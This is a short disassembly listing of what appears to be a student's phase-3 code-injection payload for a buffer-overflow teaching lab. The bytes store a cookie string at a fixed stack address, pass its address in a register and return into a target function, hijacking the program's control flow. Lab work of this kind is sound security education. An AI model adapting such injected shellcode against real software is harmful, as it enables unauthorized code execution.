
phase3.out：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	50                   	push   %rax
   1:	48 c7 c7 69 dc 61 55 	mov    $0x5561dc69,%rdi
   8:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   f:	37 66 61 
  12:	48 89 07             	mov    %rax,(%rdi)
  15:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
  19:	58                   	pop    %rax
  1a:	68 fa 18 40 00       	pushq  $0x4018fa
  1f:	c3                   	retq   
